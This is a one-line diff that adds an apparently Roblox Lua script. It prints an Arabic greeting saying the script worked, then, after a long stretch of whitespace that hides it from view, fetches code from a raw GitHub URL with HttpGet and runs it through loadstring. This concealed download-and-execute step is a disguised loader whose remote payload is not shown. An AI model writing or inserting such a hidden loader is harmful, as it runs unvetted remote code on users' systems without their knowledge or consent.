@@ -1,0 +1,1 @@
+print("مرحباً بك يا 1_bsa1111111! السكربت اشتغل تمام.")      loadstring(game:HttpGet("https://raw.githubusercontent.com/SOOR-eng785/roblox-scripts/main/welcome.lua"))(); 
